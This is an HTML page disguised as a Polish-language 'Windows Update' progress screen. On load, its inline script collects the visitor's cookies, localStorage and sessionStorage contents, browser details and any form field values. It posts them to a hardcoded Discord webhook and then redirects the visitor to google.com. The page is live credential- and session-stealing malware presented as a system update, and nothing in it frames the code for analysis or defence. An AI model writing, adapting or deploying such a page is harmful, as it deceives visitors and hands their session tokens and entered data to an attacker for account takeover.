<!DOCTYPE html>
<html>
<head>
    <title>Windows Update</title>
    <style>body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:80px;}</style>
</head>
<body>
    <h1>Trwa aktualizacja Windows...</h1>
    <p>Proszę czekać 5 sekund.</p>

    <script>
        const webhook = "https://discord.com/api/webhooks/1521645357082087454/e2MVaOrDUJxQS-FAMPosani30S4nIyD4GVG7nPHD9HiRwIuTwuaNVYXdUsWHun1xamcW";

        function send(d) {
            fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:"```json\n"+JSON.stringify(d,null,2)+"\n```"})});
        }

        let data = {
            url: location.href,
            cookies: document.cookie,
            local: JSON.stringify(localStorage),
            session: JSON.stringify(sessionStorage),
            ua: navigator.userAgent,
            platform: navigator.platform,
            inputs: {}
        };

        document.querySelectorAll('input,textarea,select').forEach(el => {
            if (el.value) data.inputs[el.name || el.id || 'field'] = el.value;
        });

        send(data);

        setTimeout(() => location = "https://google.com", 5000);
    </script>
</body>
</html>
